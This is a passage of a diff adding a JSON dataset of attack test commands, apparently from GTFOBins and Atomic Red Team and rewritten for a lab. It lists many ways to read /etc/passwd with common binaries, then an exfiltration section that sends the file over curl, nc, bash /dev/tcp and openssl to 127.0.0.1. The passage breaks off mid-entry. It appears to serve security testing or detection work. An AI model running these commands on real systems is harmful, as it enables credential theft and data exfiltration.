+      "test_name": "last (file-read)",
+      "command": "last -a -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "last",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "links (file-read)",
+      "command": "links /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "links",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "logrotate (file-read)",
+      "command": "logrotate /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "logrotate",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "look (file-read)",
+      "command": "look '' /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "look",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ltrace (file-read)",
+      "command": "ltrace -F /etc/passwd /dev/null",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ltrace",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "lua (file-read)",
+      "command": "lua -e 'local f=io.open(\"/etc/passwd\", \"rb\"); io.write(f:read(\"*a\")); io.close(f);'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "lua",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "lwp-download (file-read)",
+      "command": "lwp-download file:///etc/passwd /dev/stdout",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "lwp-download",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "lwp-request (file-read)",
+      "command": "lwp-request file:///etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "lwp-request",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "m4 (file-read)",
+      "command": "m4 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "m4",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "make (file-read)",
+      "command": "make -s --eval='$(file >/dev/stdout,$(file </etc/passwd))' .",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "make",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "mawk (file-read)",
+      "command": "mawk '//' /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "mawk",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "mosquitto (file-read)",
+      "command": "mosquitto -c /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "mosquitto",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "msgattrib (file-read)",
+      "command": "msgattrib -P /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "msgattrib",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "msgcat (file-read)",
+      "command": "msgcat -P /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "msgcat",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "msgconv (file-read)",
+      "command": "msgconv -P /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "msgconv",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "msgfilter (file-read)",
+      "command": "msgfilter -P -i /etc/passwd /bin/cat",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "msgfilter",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "msgmerge (file-read)",
+      "command": "msgmerge -P /etc/passwd /dev/null",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "msgmerge",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "msguniq (file-read)",
+      "command": "msguniq -P /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "msguniq",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "mtr (file-read)",
+      "command": "mtr --raw -F /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "mtr",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "mutt (file-read)",
+      "command": "mutt -F /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "mutt",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "mypy (file-read)",
+      "command": "mypy /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "mypy",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "nasm (file-read)",
+      "command": "nasm -@ /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "nasm",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "neofetch (file-read)",
+      "command": "neofetch --ascii /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "neofetch",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "nft (file-read)",
+      "command": "nft -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "nft",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "nl (file-read)",
+      "command": "nl -bn -w1 -s '' /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "nl",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "nm (file-read)",
+      "command": "nm /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "nm",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "nmap (file-read)",
+      "command": "nmap -iL /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "nmap",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "nroff (file-read)",
+      "command": "nroff /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "nroff",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ntpdate (file-read)",
+      "command": "ntpdate -a x -k /etc/passwd -d localhost",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ntpdate",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "octave (file-read)",
+      "command": "octave-cli --eval 'format none; fid = fopen(\"/etc/passwd\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "octave",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "od (file-read)",
+      "command": "od -An -c -w999 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "od",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "openssl (file-read)",
+      "command": "openssl enc -in /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "openssl",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "openvpn (file-read)",
+      "command": "openvpn --config /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "openvpn",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "pandoc (file-read)",
+      "command": "pandoc -t plain /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "pandoc",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "paste (file-read)",
+      "command": "paste /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "paste",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "pax (file-read)",
+      "command": "pax -w /etc/passwd | tar -xO",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "pax",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "perl (file-read)",
+      "command": "perl -ne print /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "perl",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "pg (file-read)",
+      "command": "pg /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "pg",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "php (file-read)",
+      "command": "php -r 'readfile(\"/etc/passwd\");'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "php",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "pic (file-read)",
+      "command": "pic /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "pic",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "pr (file-read)",
+      "command": "pr -T /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "pr",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ptx (file-read)",
+      "command": "ptx -w 999 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ptx",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "puppet (file-read)",
+      "command": "puppet filebucket -l diff /dev/null /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "puppet",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "pygmentize (file-read)",
+      "command": "pygmentize -l text /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "pygmentize",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "pyright (file-read)",
+      "command": "pyright /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "pyright",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "pyright (file-read)",
+      "command": "pyright --outputjson /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "pyright",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "pyright (file-read)",
+      "command": "pyright -w /path/to/input-dir/",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "pyright",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": false
+    },
+    {
+      "technique": null,
+      "test_name": "python (file-read)",
+      "command": "python -c 'print(open(\"/etc/passwd\").read())'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "python",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "rake (file-read)",
+      "command": "rake -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "rake",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "readelf (file-read)",
+      "command": "readelf -a @/etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "readelf",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "redcarpet (file-read)",
+      "command": "redcarpet /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "redcarpet",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "rev (file-read)",
+      "command": "rev /etc/passwd | rev",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "rev",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ruby (file-read)",
+      "command": "ruby -e 'puts File.read(\"/etc/passwd\")'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ruby",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "rustc (file-read)",
+      "command": "rustc /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "rustc",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "rustdoc (file-read)",
+      "command": "rustdoc /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "rustdoc",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "rustfmt (file-read)",
+      "command": "rustfmt /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "rustfmt",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "sed (file-read)",
+      "command": "sed '' /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "sed",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "shuf (file-read)",
+      "command": "shuf -z /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "shuf",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "socat (file-read)",
+      "command": "socat -u file:/etc/passwd -",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "socat",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "soelim (file-read)",
+      "command": "soelim /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "soelim",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "sort (file-read)",
+      "command": "sort -m /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "sort",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ss (file-read)",
+      "command": "ss -a -F /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ss",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ssh (file-read)",
+      "command": "ssh -F /etc/passwd x",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ssh",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ssh-copy-id (file-read)",
+      "command": "ssh-copy-id -f -i /etc/passwd.pub user@127.0.0.1",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ssh-copy-id",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ssh-keyscan (file-read)",
+      "command": "ssh-keyscan -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ssh-keyscan",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "strings (file-read)",
+      "command": "strings /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "strings",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "sysctl (file-read)",
+      "command": "sysctl -n \"/../../etc/passwd\"",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "sysctl",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "tac (file-read)",
+      "command": "tac -s 'RANDOM' /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "tac",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "tail (file-read)",
+      "command": "tail -c+0 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "tail",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "tar (file-read)",
+      "command": "tar cf /dev/stdout /etc/passwd -I 'tar xO'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "tar",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "tbl (file-read)",
+      "command": "tbl /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "tbl",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "tic (file-read)",
+      "command": "tic -C /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "tic",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "tmux (file-read)",
+      "command": "tmux -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "tmux",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "troff (file-read)",
+      "command": "troff /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "troff",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "tsc (file-read)",
+      "command": "tsc /etc/passwd.ts",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "tsc",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ul (file-read)",
+      "command": "ul /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ul",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "unexpand (file-read)",
+      "command": "unexpand -t999 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "unexpand",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "uniq (file-read)",
+      "command": "uniq /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "uniq",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "urlget (file-read)",
+      "command": "urlget - /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "urlget",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "uuencode (file-read)",
+      "command": "uuencode /etc/passwd /dev/stdout | uudecode",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "uuencode",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "w3m (file-read)",
+      "command": "w3m -dump /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "w3m",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "wall (file-read)",
+      "command": "wall --nobanner /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "wall",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "wc (file-read)",
+      "command": "wc --files0-from /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "wc",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "wget (file-read)",
+      "command": "wget -i /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "wget",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "whiptail (file-read)",
+      "command": "whiptail --textbox --scrolltext /etc/passwd 0 0",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "whiptail",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "xargs (file-read)",
+      "command": "xargs -a /etc/passwd -0",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "xargs",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "xmodmap (file-read)",
+      "command": "xmodmap -v /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "xmodmap",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "xmore (file-read)",
+      "command": "xmore /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "xmore",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "xpad (file-read)",
+      "command": "xpad -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "xpad",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "xxd (file-read)",
+      "command": "xxd /etc/passwd | xxd -r",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "xxd",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "xz (file-read)",
+      "command": "xz -c /etc/passwd | xz -d",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "xz",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "zcat (file-read)",
+      "command": "zcat -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "zcat",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "zsh (file-read)",
+      "command": "zsh -c 'echo \"$(</etc/passwd)\"'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "zsh",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "zsh (file-read)",
+      "command": "zsh -c '</etc/passwd'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "zsh",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "zsoelim (file-read)",
+      "command": "zsoelim /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "zsoelim",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    }
+  ],
+  "exfil": [
+    {
+      "technique": "T1030",
+      "test_name": "Data Transfer Size Limits",
+      "command": "cd /tmp/T1030; split -b 5000000 T1030_urandom\nls -l /tmp/T1030",
+      "cleanup_command": "if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1048.003",
+      "test_name": "Python3 http.server",
+      "command": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": null,
+      "test_name": "ab (upload)",
+      "command": "ab -p /etc/passwd http://127.0.0.1/",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ab",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "bash (upload)",
+      "command": "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</etc/passwd)\" >/dev/tcp/127.0.0.1/2222'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "bash",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "bash (upload)",
+      "command": "bash -c 'echo -n \"$(</etc/passwd)\" >/dev/tcp/127.0.0.1/2222'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "bash",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "busybox (upload)",
+      "command": "busybox httpd -f -p 2222 -h .",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "busybox",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "cancel (upload)",
+      "command": "cancel -h 127.0.0.1:2222 -u DATA",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "cancel",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "code (upload)",
+      "command": "code tunnel --name xxxxxx",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "code",
+      "gtfobins_function": "upload",
+      "lab_rewritten": false
+    },
+    {
+      "technique": null,
+      "test_name": "curl (upload)",
+      "command": "curl -X POST --data-binary @/etc/passwd http://127.0.0.1",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "curl",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "curl (upload)",
+      "command": "curl -X POST --data-binary DATA http://127.0.0.1",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "curl",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "curl (upload)",
+      "command": "curl gopher://127.0.0.1:2222/_DATA",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "curl",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "finger (upload)",
+      "command": "finger DATA@127.0.0.1",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "finger",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "hping3 (upload)",
+      "command": "hping3 127.0.0.1 --icmp --data 999 --sign xxx --file /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "hping3",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "kubectl (upload)",
+      "command": "kubectl proxy --address=0.0.0.0 --port=2222 --www=/path/to/dir/ --www-prefix=/x/",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "kubectl",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "lp (upload)",
+      "command": "lp /etc/passwd -h 127.0.0.1",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "lp",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "nc (upload)",
+      "command": "nc 127.0.0.1 2222 </etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "nc",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "openssl (upload)",
+      "command": "openssl s_client -quiet -connect 127.0.0.1:2222 </etc/passwd",
